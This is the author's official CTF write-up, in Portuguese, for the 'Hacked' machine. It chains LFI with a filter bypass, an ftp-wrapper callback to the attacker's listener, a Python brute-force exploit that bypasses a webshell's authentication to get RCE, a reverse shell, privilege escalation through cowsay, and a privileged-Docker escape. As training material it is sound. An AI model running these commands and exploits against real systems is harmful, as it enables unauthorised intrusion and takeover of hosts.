---
layout: post
title:  "UHCCTF (Classificatória) - Hacked (Official Write-Up)"
tags: pt-br ctf write-up
---

Essa máquina foi feita por mim com ajuda dos meus amigos Luska e Kadu para o UHC. Os arquivos dela e o Dockerfile estarão no meu GitHub.

# Recon

A primeira página é uma linda arte (uma deface), dizendo que o site foi hackeado:

![/assets/hacked/Untitled.png](/assets/hacked/Untitled.png)

Logo de cara temos uma flag, essa eu não censurei pois é literalmente abrir o site. Lendo o source code da página não encontrei nada, como esse arquivo deve ser o index vamos rodar um fuzzing no site para achar mais arquivos e diretórios. Utilizei o ffuf com as wordlists do [seclists](https://github.com/danielmiessler/SecLists).

common.txt:

![/assets/hacked/Untitled%201.png](/assets/hacked/Untitled%201.png)

De costume vou testar esse /uploads/, mas deu 404 😢

raft-small-files.txt:

![/assets/hacked/Untitled%202.png](/assets/hacked/Untitled%202.png)

Parece que encontramos um também "home.php" vamos dar uma olhada:

![/assets/hacked/Untitled%203.png](/assets/hacked/Untitled%203.png)

Um site sobre customização de carros, vamos dar uma navegada no site para ver se encontramos algo interessante:

Logo percebemos que quando clicamos nos botões ali no cabeçalho não somos redirecionados para a página deles, e sim a página deles é "incluída"  em um parâmetro GET no home.php:

![/assets/hacked/Untitled%204.png](/assets/hacked/Untitled%204.png)

Isso parece estar vulnerável a Local File Inclusion (LFI), uma vulnerabilidade que permite ao atacante incluir ou ler arquivos do servidor...

(Agora vai ter uma divisão no write-up para você que fez a máquina no dia do uhc ou no UHCLABS ou se você estiver rodando no docker. Se você estiver no docker ou localmente sem nenhum WAF é só pular a próxima parte "WAF bypass")

# Exploitation 
## LFI

No UHC havia um WAF do cloudfare, e isso impossibilitou ler arquivos do servidor completamente, então vamos seguir com a exploração do nosso LFI, vamos fazer um teste tentando incluir o nosso home.php alterando a URL para: (apenas home pois nas outras páginas ele auto completa o .php):

```bash
https://hacked.uhclabs.com/home.php?page=home
```

![/assets/hacked/Untitled%205.png](/assets/hacked/Untitled%205.png)

![/assets/hacked/Untitled%206.png](/assets/hacked/Untitled%206.png)

A página ficou duplicada, e no source podemos comprovar isso, porém, se a página é um php que inclui outras páginas, onde está as tags php e o código php para nós vermos como isso funciona? 

Ai é que está o WAF (Web Application Firewall) está omitindo o código php do nosso arquivo. Então teremos de fazer um Bypass do WAF e acessar diretamente o ip do servidor, e para isso vamos aproveitar nosso LFI.

### Exploitation Bypass WAF

Para explorar esse bypass utilizaremos os wrappers do php. ([https://www.php.net/manual/en/wrappers.php](https://www.php.net/manual/en/wrappers.php))

![/assets/hacked/Untitled%207.png](/assets/hacked/Untitled%207.png)

Vamos usar o wrapper do ftp para fazer o site fazer uma requisição para o nosso IP como se fosse se conectar ao ftp assim nos indicando qual é o IP real do servidor.

Na minha máquina:

```bash
nc -lvp 4444
```

Payload:

```
https://hacked.uhclabs.com/home.php?page=ftp://IP:PORT/x
```

Recebemos:

![/assets/hacked/Untitled%208.png](/assets/hacked/Untitled%208.png)

Esses servidores ec2 da amazom para pegar o ip é só pegar esses números da url: 34.219.224.183

Vamos acessar e rodar a inclusão do home.php e deve funcionar.


![/assets/hacked/Untitled%209.png](/assets/hacked/Untitled%209.png)

Apenas trocando a URL por home ele automaticamente adicionou o .php e nos mostrou o conteúdo do arquivo home.php.

Lendo esse código podemos perceber que ele tem algumas proteções quanto a algumas coisas. Vamos tentar ler arquivos do servidor no caso o clássico /etc/passwd:

 (../ serve para voltar diretórios)

![/assets/hacked/Untitled%2010.png](/assets/hacked/Untitled%2010.png)

![/assets/hacked/Untitled%2011.png](/assets/hacked/Untitled%2011.png)

Pelo o que podemos ver retornou um erro, que podemos entender já que temos o código. Da nossa payload ele retirou todos os "../" e substituiu por "" (nada) , ele retirou a palavra "passwd" e trocou por "ERROR" e por fim adicionou ".php" no final, logo o arquivo não existe e ele não mostra o conteúdo.

Lendo o código podemos ver que a proteção de "../" está vulnerável a um bypass que consiste em escrever uma palavra dentro da outra:

```
pal(palavra)avra -> palpalavraavra
.(../)./ -> ..././
```

Assim quando o código retirar a primeira palavra ele vai concatenar a palavra proibida passando o que queremos.

Para bypassarmos o ERROR não vamos conseguir, portando vamos ler outro arquivo que não esteja na nossa blackllist como /etc/hosts.

Agora o .php no final, tem uma linha no código que diz que se existir um parâmetro GET chamado "ext" ele vai usar o que estiver nele para completar a extensão do arquivo, e se o parâmetro não estiver setado ele vai adicionar .php no final. Logo o que temos que fazer é setar o parâmetro ext para ""(nada).

Vamos a payload:

```
34.219.224.183/home.php?page=..././..././..././..././..././etc/hosts&ext=
```

Conseguimos!

![/assets/hacked/Untitled%2012.png](/assets/hacked/Untitled%2012.png)

Bom agora parece que teremos que ler algum arquivo do servidor, poderíamos fazer um fuzzing usando o LFI ou refazer nosso fuzzing novamente e usar o LFI para ler os arquivos. Rodei a wordlist raft-large-words.txt com a extensão php. (Usei um filtro de tamanho do ffuf "-fs 283")

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u 'https://hacked.uhclabs.com/uploads/FUZZ' -e .php 
```

![/assets/hacked/Untitled%2013.png](/assets/hacked/Untitled%2013.png)

Parece que encontramos a webshell que o hacker usou para invadir esse sistema, vamos dar uma olhada nela e ao mesmo tempo usar o nosso LFI para ler ela. Opa achamos uma flag!

![/assets/hacked/Untitled%2014.png](/assets/hacked/Untitled%2014.png)

![/assets/hacked/Untitled%2015.png](/assets/hacked/Untitled%2015.png)

# Exploitation 
## Part2

Pelo jeito é uma webshell com senha:

```php
<?php
$pass1 = $_GET['pass1'];
$pass2 = $_GET['pass2'];
$secret = file_get_contents('../../secret'); // /var/www
$hmac_client = hash_hmac('sha256', $pass1, $pass2);
$hmac_server = hash_hmac('sha256', 'Gu%40$!mN0123', $secret);
$hmac_server =  (int)$hmac_server;
if($_COOKIE['token']){
    $hmac_client = $_COOKIE['token'];
}; 

if($hmac_client == $hmac_server):
    setcookie('token', $hmac_client);
?>
```

Esse é o código, dando uma olhada ele faz uma hash usando a senha1(Gu%40$!mN0123) e a senha2 (conteúdo do ../../secret), e ele compara essa hash com a hash feita com os valores que o usuário passa via GET, porém existe um (int) que transforma a hash do servidor em um valor inteiro. Vamos reproduzir isso localmente...

```php
<?php
$secret = "anything";
$hmac_server = hash_hmac('sha256', 'Gu%40$!mN0123', $secret);
echo "hash: ";
echo $hmac_server;
echo " ";
echo "int: ";
echo (int)$hmac_server;
?>
```

Retorna:

![/assets/hacked/Untitled%2016.png](/assets/hacked/Untitled%2016.png)

Aqui vemos como essa conversão da hash para um numero inteiro funciona, o php pega então os primeiros números da hash com o (int) e compara com o valor passado pelo usuário, outra coisa legal é que o usuário pode passar esse valor via COOKIE..., logo poderemos declarar nosso cookie "token" para algum número inteiro e a comparação ira dar TRUE.

```php
if($hmac_client == $hmac_server): // vulnerable
```

Vamos então encontrar um número inteiro que consiga gerar TRUE na comparação e bypassar a autenticação da webshell. Podemos ver no código que existe um parâmetro POST chamado cmd que é usado quando a autenticação retorna TRUE , e esse parâmetro é o código que será executado na webshell. Pensando nisso escrevi um exploit em python para fazer um bruteforce de valores numéricos no cookie até conseguir a autenticação e por fim rodar o comando que eu quiser na máquina.

```python
import requests
import sys
cmd = sys.argv[1]
url = "http://34.219.224.183/uploads/webshell.php"
for num in range(0, 1000):
        token = num
        print("[INFO] Testing: ", token)
        cookies = {'token': str(token)}
        r = requests.get(url, cookies=cookies)
        if len(r.text) != 565:
                print("[EXPLOIT] Token:", token, "CMD:", cmd)
                payload = {'cmd': cmd}
                a = requests.post(url, data=payload, cookies=cookies)
                print(a)
```

![/assets/hacked/Untitled%2017.png](/assets/hacked/Untitled%2017.png)

Funcionou o cookie que começa com 9, mesmo ja tendo RCE,  vamos setar o cookie e ver a webshell...

Apenas setei o cookie para 9:

![/assets/hacked/Untitled%2018.png](/assets/hacked/Untitled%2018.png)

Uma webshell muito linda! Agora que temos RCE vamos pegar uma shell.

# Exploitation
## Part3

Habemos Shel!

Eu utilizei um site para pegar a shell porém, eu poderia ter usado também o [https://www.revshells.com/](https://www.revshells.com/) que é um gerador de comandos, para pegar uma shell, eu apenas coloco as informações e ele gera a payload para eu mandar para o servidor 😉.

![/assets/hacked/Untitled%2019.png](/assets/hacked/Untitled%2019.png)

```
Full tty shell
in your rev-shell~ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
in your terminal~ stty raw -echo; fg
ENTER
in your rev-shell~ export TERM=xterm
```

Fazendo um recon básico com o "sudo -l" podemos ver que conseguimos rodar um programa com um outro usuário na maquina sem senha. 

![/assets/hacked/Untitled%2020.png](/assets/hacked/Untitled%2020.png)

No caso o programa que podemos rodar é o cowsay:

![/assets/hacked/Untitled%2021.png](/assets/hacked/Untitled%2021.png)

Dando uma olhada no [GTFObins](https://gtfobins.github.io/gtfobins/cowsay/) podemos ver como funciona o priv esc utilizando o cowsay:

![/assets/hacked/Untitled%2022.png](/assets/hacked/Untitled%2022.png)

![/assets/hacked/Untitled%2023.png](/assets/hacked/Untitled%2023.png)

Basicamente o argumento -f no cowsay nos permite setar o "estilo" da vaquinha, porém esse estilo é um script em perl, logo podemos escrever um template malicioso e mandar o cowsay executar, agora vamos apenas fazer isso.

![/assets/hacked/Untitled%2024.png](/assets/hacked/Untitled%2024.png)

Agora como usuário john rodando um "ls -la" na home dele podemos encontrar a próxima flag:

![/assets/hacked/Untitled%2025.png](/assets/hacked/Untitled%2025.png)

# Exploitation 
## Part4

Rodando novamente o "sudo -l" podemos rodar /bin/sh como root sem senha, então bora la pegar esse root!

![/assets/hacked/Untitled%2026.png](/assets/hacked/Untitled%2026.png)

Ué, cade a flag? Esse root não foi muito facil?

![/assets/hacked/Untitled%2027.png](/assets/hacked/Untitled%2027.png)

Parece que estamos dentro de um docker e teremos que escapar dele, eu poderia testar algumas formas manuais de verificar como vamos fazer isso porém rodei uma tool chamada deepce que ja me deu uma dica de um possível vetor de ataque...

![/assets/hacked/Untitled%2028.png](/assets/hacked/Untitled%2028.png)

![/assets/hacked/Untitled%2029.png](/assets/hacked/Untitled%2029.png)

Pelo jeito estamos em um container privilegiado, isso significa que podemos montar os arquivos do host dentro do nosso container ou até mesmo executar comandos no host.

Vamos rodar um: (Para visualizar os discos do servidor do host)

```python
fdisk -l
```

E então montar o disco no nosso container:

```python
mkdir -p /mnt/a
mount /dev/xvda1 /mnt/a
```

Agora vamos usar o chroot aonde montamos o disco:

![/assets/hacked/Untitled%2030.png](/assets/hacked/Untitled%2030.png)

E conseguimos! mais uma flag de brinde!

Espero que tenham gostado, para você que leu até aqui, obrigado!

H4ckTh3Pl4n3t!